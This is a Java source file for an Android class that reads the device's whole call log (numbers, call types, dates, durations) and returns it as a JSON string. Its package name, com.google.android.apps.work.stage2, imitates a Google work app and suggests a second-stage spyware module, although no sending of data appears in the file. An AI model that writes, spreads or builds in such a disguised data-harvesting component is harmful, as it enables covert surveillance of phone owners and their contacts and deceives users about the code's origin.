package com.google.android.apps.work.stage2;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

public class CallLogInfoGatherer {

    public static String getAllCallLogs(Context context) {
        JSONArray jsonArray = new JSONArray();
        ContentResolver contentResolver = context.getContentResolver();

        String[] projection = new String[]{
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
        };

        try (Cursor cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC")) {

            if (cursor != null) {
                int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
                int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);

                while (cursor.moveToNext()) {
                    String number = cursor.getString(numberIndex);
                    int type = cursor.getInt(typeIndex);
                    long date = cursor.getLong(dateIndex);
                    String duration = cursor.getString(durationIndex);

                    JSONObject callLog = new JSONObject();
                    callLog.put("number", number);
                    callLog.put("type", getCallTypeString(type));
                    callLog.put("date", date);
                    callLog.put("duration", duration);
                    jsonArray.put(callLog);
                }
            }
        } catch (Exception e) {
            Log.e("CallLogGatherer", "Error gathering call logs", e);
        }

        return jsonArray.toString();
    }

    private static String getCallTypeString(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "INCOMING";
            case CallLog.Calls.OUTGOING_TYPE:
                return "OUTGOING";
            case CallLog.Calls.MISSED_TYPE:
                return "MISSED";
            case CallLog.Calls.VOICEMAIL_TYPE:
                return "VOICEMAIL";
            case CallLog.Calls.REJECTED_TYPE:
                return "REJECTED";
            case CallLog.Calls.BLOCKED_TYPE:
                return "BLOCKED";
            default:
                return "UNKNOWN";
        }
    }
}
